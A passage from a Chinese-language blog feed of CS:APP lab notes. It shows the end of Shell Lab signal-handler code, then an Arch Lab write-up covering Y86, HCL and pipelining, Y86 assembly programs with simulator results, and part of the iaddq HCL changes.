(WIFSTOPPED(status)) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Job [%d] (%d) stopped by signal %d\n&quot;</span>, jid, pid, WSTOPSIG(status));<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        unix_error(<span class="hljs-string">&quot;waitfg: waitpid error&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">sigchld_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span> &#123;<br>    <span class="hljs-comment">// 回收</span><br>    <span class="hljs-type">int</span> olderrno = errno;<br>    <span class="hljs-type">sigset_t</span> mask_all, prev_all;<br>    sigfillset(&amp;mask_all);<br>    <span class="hljs-type">int</span> pid, status;<br><br>    <span class="hljs-keyword">while</span> ((pid = waitpid(<span class="hljs-number">-1</span>, &amp;status, WNOHANG)) &gt; <span class="hljs-number">0</span>) &#123;<br>        sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all); <br>        deletejob(jobs, pid);<br>        sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="hljs-literal">NULL</span>);<br>    &#125;<br>    <span class="hljs-comment">// if (errno != ECHILD) &#123;</span><br>    <span class="hljs-comment">//     unix_error(&quot;waitpid error&quot;);</span><br>    <span class="hljs-comment">// &#125;</span><br>    errno = olderrno;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">sigint_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span> &#123;<br>    <span class="hljs-type">int</span> pid = fgpid(jobs);<br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;    <br>    <span class="hljs-keyword">else</span> &#123;<br>        kill(-pid, SIGINT);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">sigtstp_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span> &#123;<br>    <span class="hljs-type">int</span> pid = fgpid(jobs);<br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;    <br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">struct</span> <span class="hljs-type">job_t</span> *cj = getjobpid(jobs, pid);<br>        cj-&gt;state = ST;  <br>        kill(-pid, SIGTSTP);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CS:APP Arch Lab记录</title>
    <link href="/2023/06/29/arch/"/>
    <url>/2023/06/29/arch/</url>
    
    <content type="html"><![CDATA[<h1 id="前置知识">前置知识</h1><h2 id="y86">Y86</h2><p>esp - rsp 第三版CSAPP全部使用8Byte</p><p>Y86指令集对应Y86处理器，Sequentialoperation，每个周期执行一个完整的Y86指令，可以拆分出五个阶段，执行指令流水线（？数字电路的实现）</p><p>programmer-visible 程序员可见的状态，编译器 /用汇编代码写程序的人，Y86与x86对应的寄存器结构是类似的，栈指针、传参、返回参数、条件码、PC。</p><p>Y86的汇编指令使用内存虚拟地址，由硬件和操作系统在读入程序时载入。状态码Stat异常状态。</p><p>只有8字节的数据，称之为word 字，变长指令字，</p><p>addl, subl, andl, and xorl 对应 ZF, SF, and OF (zero, sign, andoverflow)</p><h2 id="hcl">HCL</h2><p>硬件控制语言，从逻辑电路图到硬件描述语言，Verilog根据描述生成电路，high-level Language。SingleBit，高电平表示1，反之表示0，与或非门。基本的对象时逻辑电路，bool eq =(a &amp;&amp; b) || (!a &amp;&amp; !b) ，持续响应输入的变化。</p><p>出于简单，每个字集都视为int，有 bool Eq = (A == B)。</p><p>基于设计的存储网络，决定各个存储设备值的组合电路逻辑。</p><h3 id="硬件基础">硬件基础</h3><p>组合电路，不需要时序信息，参考三极管等原件的特性，输入改变自然输出改变。若要生成有顺序的时序电路，需要引入时钟。</p><p>时钟寄存器（区分机器级编程提到的寄存器文件），只有在时钟上升沿才会改变自身的输出，就可以确保数据之间读取改变的先后顺序。</p><p>随机访问存储器（内存+寄存器文件）；在读取时等价于组合电路，只需要输入改变（寻址改变）输出随之改变（对应寄存器的值）；在写入时则不同，由一个时钟控制。因此只读存储器，如指令存储器可以看作组合电路。</p><p><img src="../images/cpu.png" alt="流程" style="zoom:50%;"  /></p><p>6类操作</p><ol type="1"><li>Fetch icode(指令代码) + ifun(指令功能 指导ALU) + (rA rB reg) +valp(顺序计算Increment)</li><li>Decode 等价组合逻辑电路 读出ALU A ALU B<br /></li><li>Execute ALU运算(参考ifun)，设置条件码（condition code register(CC)），ifun给出传送条件</li><li>Memory 写/读 valM</li><li>Write Back 写回存储器</li><li>更新PC</li></ol><p>单个周期内，Y86-64的指令集不会读出现过写的状态。在时钟下，InputPC改变，当组合电路稳定之后，因为只取决于上一阶段的值，可以确保同时进行。(写操作需要另外的时钟，这里简化讨论)</p><p><img src="/images/cycle.png" alt="Cycle" style="zoom:50%;"  /></p><p>具体而言：</p><p>对条件转移，不会有运算设置完条件码后，直接读取条件码。只有运算后，才另外判断jmp。</p><p>对pushq而言，并不能rsp-8后直接M(rsp)，而应该使用rsp-8得到的valE，直接M(valE)（同时写入rsp)。</p><h3 id="pipeline">Pipeline</h3><p>使用流水线操作，借助时钟使得上个Stage结束的同时，下个Stage正好开始即可（选择每个Stage最长的时间，就可以只用一个统一的时钟。</p><p><img src="../images/pipe.png" alt="PIPE" style="zoom:50%;"  /></p><p>比较Seq结构与Pipe结构，虽然单个指令的执行时间甚至更长，但可以同时运行至多三个指令，使得整体的吞吐量更大。流水线需要每个组合逻辑的耗时相同，长链条也使得更有效率的设计更困难(NonuniformPartitioning)流水线链条越长，需要处理的冲突越多，寄存器用于等待的时间也越长(DiminishingReturns of Deep Pipelining)</p><p><img src="../images/diff_pipe.png" alt="diff" style="zoom:50%;"  /></p><p>Pipeline Hazard 数据冒险 控制冒险</p><p>Stall - 等价于动态生成所需数量的nop指令</p><p>Forward 数据旁路，可以处理寄存器写后读的问题，不能处理load/use，读内存在写入阶段才得到操作数。后者依旧使用Stall(loadinterlock)。</p><p>控制冒险，在得到准确的跳转PC前的所有阶段都应该插入nop</p><p>异常处理。</p><h1 id="具体流程">具体流程</h1><h2 id="part-a">Part A</h2><p>汇编程序</p><p>定义出链表的结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># Sample linked list<br>.align 8<br>ele1:<br>.quad 0x00a<br>.quad ele2<br>ele2:<br>.quad 0x0b0<br>.quad ele3<br>ele3:<br>.quad 0xc00<br>.quad 0<br></code></pre></td></tr></table></figure><p>C语言传参与处理的汇编代码</p><p>main函数内定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"># C 需要<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>代表结构体，一般辅助使用<span class="hljs-title">typedef</span> </span><br><span class="hljs-class"><span class="hljs-title">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>&#123;</span><br>    <span class="hljs-type">int</span> v;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">next</span>;</span><br>&#125;Node;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">(Node *head)</span> &#123;<br>    <span class="hljs-type">int</span> v = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(head) &#123;<br>        v += head-&gt;v;<br>        head = head-&gt;next; <br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    Node n1, n2, n3;<br>    n1.v = <span class="hljs-number">1</span>, n1.next = &amp;n2, n2.v = <span class="hljs-number">2</span>, n2.next = &amp;n3, n3.v = <span class="hljs-number">3</span>, n3.next = <span class="hljs-number">0</span>;<br>    add(&amp;n1); <br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># ATT 格式 x86 <br><br># 申请空间<br>subq$64, %rsp<br># ? 段保护<br>movq%fs:40, %rax<br># 占一个8Byte<br>movq%rax, -8(%rbp)<br># 清 0<br>xorl%eax, %eax<br><br># n1.v = 1<br>movl$1, -64(%rbp)<br><br># &amp;n2 -&gt; n1.next<br>leaq-48(%rbp), %rax<br>movq%rax, -56(%rbp)<br><br># n2.v = 2, 同时代表&amp;n2<br>movl$2, -48(%rbp)<br>leaq-32(%rbp), %rax<br>movq%rax, -40(%rbp)<br>movl$3, -32(%rbp)<br>movq$0, -24(%rbp)<br><br># 传入 &amp;n1<br>leaq-64(%rbp), %rax<br><br>movq%rax, %rdi<br></code></pre></td></tr></table></figure><p>全局变量的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>&#123;</span><br>    <span class="hljs-type">int</span> v;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">next</span>;</span><br>&#125;Node;<br><br>Node n3 = &#123;<span class="hljs-number">3</span>, <span class="hljs-number">0</span>&#125;, n2 = &#123;<span class="hljs-number">2</span>, &amp;n3&#125;, n1 = &#123;<span class="hljs-number">1</span>, &amp;n2&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">(Node *head)</span> &#123;<br>    <span class="hljs-type">int</span> v = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(head) &#123;<br>        v += head-&gt;v;<br>        head = head-&gt;next; <br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    add(&amp;n1); <br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs assembly">n3:<br>.long3<br>.zero4<br>.quad0<br>.globln2<br>.section.data.rel.local,&quot;aw&quot;<br>.align 16<br>.typen2, @object<br>.sizen2, 16<br>n2:<br>.long2<br>.zero4<br>.quadn3<br>.globln1<br>.align 16<br>.typen1, @object<br>.sizen1, 16<br>n1:<br>.long1<br>.zero4<br>.quadn2<br>.text<br>.globladd<br>.typeadd, @function<br><br># [rip + a] or AT&amp;T a(%rip) means to calculate a rel32 displacement to reach a<br><br># 代表n1的地址 （指向代码段而不是栈，代表全局变量）<br>leaqn1(%rip), %rdi<br><br># 后借助8 Byte后的地址完成跳转<br>movq-24(%rbp), %rax<br>movq8(%rax), %rax<br></code></pre></td></tr></table></figure><p>ys中都使用全局变量的方式，寻址的方式也较为简单</p><p>注意有INIT的过程，需要手动声明栈大小等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># Sample linked list<br>    .pos 0<br>    irmovq stack, %rsp <br>    call main<br>    halt<br>    <br>    .align 8<br>ele1:<br>.quad 0x00a<br>.quad ele2<br>ele2:<br>.quad 0x0b0<br>.quad ele3<br>ele3:<br>.quad 0xc00<br>.quad 0<br><br>main:<br>    irmovq ele1, %rdx<br>    pushq %rdx<br>    call add<br>    ret<br><br>add:<br>    pushq %rbp<br>    rrmovq %rsp, %rbp<br>    xorq %rax, %rax<br>    mrmovq 16(%rbp), %rcx<br>loop:<br>    andq %rcx, %rcx<br>    je end<br>    mrmovq (%rcx), %rdx<br>    addq %rdx, %rax<br>    mrmovq 8(%rcx), %rcx<br>    jmp loop<br>end: <br>    popq %rbp<br>    ret    <br><br>    .pos 200<br>stack:<br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Stopped <span class="hljs-keyword">in</span> 33 steps at PC = 0x18.  Status <span class="hljs-string">&#x27;HLT&#x27;</span>, CC <span class="hljs-attribute">Z</span>=1 <span class="hljs-attribute">S</span>=0 <span class="hljs-attribute">O</span>=0<br>Changes <span class="hljs-keyword">to</span> registers:<br>%rax:   0x0000000000000000      0x0000000000000cba<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">main:<br>    irmovq ele1, %rdi<br>    call rsum<br>    ret<br><br>rsum:<br>    xorq %rax, %rax <br>    andq %rdi, %rdi<br>    je end<br>    pushq %rbp<br>    rrmovq %rsp, %rbp <br>    mrmovq (%rdi), %rcx<br>    mrmovq 8(%rdi), %rdi<br>    pushq %rcx<br>    call rsum<br>    popq %rcx<br>    addq %rcx, %rax <br>    rrmovq %rbp, %rsp<br>    popq %rbp<br>end:<br>    ret <br><br># 十进制 200会爆栈<br>    .pos 0x200<br>stack:<br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Stopped <span class="hljs-keyword">in</span> 52 steps at PC = 0x13.  Status <span class="hljs-string">&#x27;HLT&#x27;</span>, CC <span class="hljs-attribute">Z</span>=0 <span class="hljs-attribute">S</span>=0 <span class="hljs-attribute">O</span>=0<br>Changes <span class="hljs-keyword">to</span> registers:<br>%rax:   0x0000000000000000      0x0000000000000cba<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># Source block<br>src:<br>    .quad 0x00a<br>    .quad 0x0b0<br>    .quad 0xc00<br><br># Destination block<br>dest:<br>    .quad 0x111<br>    .quad 0x222<br>    .quad 0x333<br><br>copy:<br>    mrmovq 8(%rsp), %rdx<br>    mrmovq 16(%rsp), %rcx<br>    mrmovq 24(%rsp), %rbx<br>    xorq %rax, %rax   <br>loop:<br>    andq %rdx, %rdx<br>    je end<br>    irmovq $-1, %r8<br>    addq %r8, %rdx<br>    mrmovq (%rbx), %r8<br>    xorq %r8, %rax<br>    rmmovq %r8, (%rcx) <br>    irmovq $8, %r8<br>    addq %r8, %rcx<br>    addq %r8, %rbx  <br>    jmp loop<br>end:<br>    ret<br><br>main:<br>    irmovq src, %rdx<br>    pushq %rdx<br>    irmovq dest, %rdx<br>    pushq %rdx<br>    irmovq 0x3, %rdx<br>    pushq %rdx<br>    call copy<br>    ret<br><br>    .pos 0x200<br>stack:<br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dns">Stopped in <span class="hljs-number">51</span> steps at PC = <span class="hljs-number">0</span>x3.  Status &#x27;HLT&#x27;, CC Z=<span class="hljs-number">1</span> S=<span class="hljs-number">0</span> O=<span class="hljs-number">0</span><br>Changes to registers:<br>%rax:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x0000000000000cba<br>%rcx:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000048</span><br>%rbx:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000030</span><br>%rsp:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x000000<span class="hljs-number">00000001e8</span><br>%r8:    <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000008</span><br><br>Changes to memory:<br><span class="hljs-number">0</span>x0030: <span class="hljs-number">0</span>x0000<span class="hljs-number">000000000111</span>      <span class="hljs-number">0</span>x000000000000000a<br><span class="hljs-number">0</span>x0038: <span class="hljs-number">0</span>x0000<span class="hljs-number">000000000222</span>      <span class="hljs-number">0</span>x000000<span class="hljs-number">00000000b0</span><br><span class="hljs-number">0</span>x0040: <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000333</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000c00</span><br></code></pre></td></tr></table></figure><h2 id="part-b">Part B</h2><p>只需要在固定的结构中加入操作码即可。</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">#### Fetch Stage     ###</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><br><span class="hljs-comment"># Determine instruction code</span><br>word icode = [<br>imem_error: INOP;<br><span class="hljs-number">1</span>: imem_icode;<span class="hljs-comment"># Default: get from instruction memory</span><br>];<br><br><span class="hljs-comment"># Determine instruction function</span><br>word ifun = [<br>imem_error: FNONE;<br><span class="hljs-number">1</span>: imem_ifun;<span class="hljs-comment"># Default: get from instruction memory</span><br>];<br><br>bool instr_valid = icode <span class="hljs-keyword">in</span> <br>&#123; INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,<br>       IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ&#125;;<br><br><span class="hljs-comment"># Does fetched instruction require a regid byte?</span><br>bool need_regids =<br>icode <span class="hljs-keyword">in</span> &#123; IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, <br>     IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ&#125;;<br><br><span class="hljs-comment"># Does fetched instruction require a constant word?</span><br>bool need_valC =<br>icode <span class="hljs-keyword">in</span> &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL, IIADDQ&#125;;<br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">#### Decode Stage    ###</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><br><span class="hljs-comment">## What register should be used as the A source?</span><br>word srcA = [<br>icode <span class="hljs-keyword">in</span> &#123; IRRMOVQ, IRMMOVQ, IOPQ, IPUSHQ  &#125; : rA;<br>icode <span class="hljs-keyword">in</span> &#123; IPOPQ, IRET &#125; : RRSP;<br><span class="hljs-number">1</span> : RNONE; <span class="hljs-comment"># Don&#x27;t need register</span><br>];<br><br><span class="hljs-comment">## What register should be used as the B source?</span><br>word srcB = [<br>icode <span class="hljs-keyword">in</span> &#123; IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ&#125; : rB;<br>icode <span class="hljs-keyword">in</span> &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;<br><span class="hljs-number">1</span> : RNONE;  <span class="hljs-comment"># Don&#x27;t need register</span><br>];<br><br><span class="hljs-comment">## What register should be used as the E destination?</span><br>word dstE = [<br>icode <span class="hljs-keyword">in</span> &#123; IRRMOVQ &#125; &amp;&amp; Cnd : rB;<br>icode <span class="hljs-keyword">in</span> &#123; IIRMOVQ, IOPQ, IIADDQ&#125; : rB;<br>icode <span class="hljs-keyword">in</span> &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;<br><span class="hljs-number">1</span> : RNONE;  <span class="hljs-comment"># Don&#x27;t write any register</span><br>];<br><br><span class="hljs-comment">## What register should be used as the M destination?</span><br>word dstM = [<br>icode <span class="hljs-keyword">in</span> &#123; IMRMOVQ, IPOPQ &#125; : rA;<br><span class="hljs-number">1</span> : RNONE;  <span class="hljs-comment"># Don&#x27;t write any register</span><br>];<br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">#### Execute Stage   ###</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><br><span class="hljs-comment">## Select input A to ALU</span><br>word aluA = [<br>icode <span class="hljs-keyword">in</span> &#123; IRRMOVQ, IOPQ &#125; : valA;<br>icode <span class="hljs-keyword">in</span> &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125; : valC;<br>icode <span class="hljs-keyword">in</span> &#123; ICALL, IPUSHQ &#125; : <span class="hljs-number">-8</span>;<br>icode <span 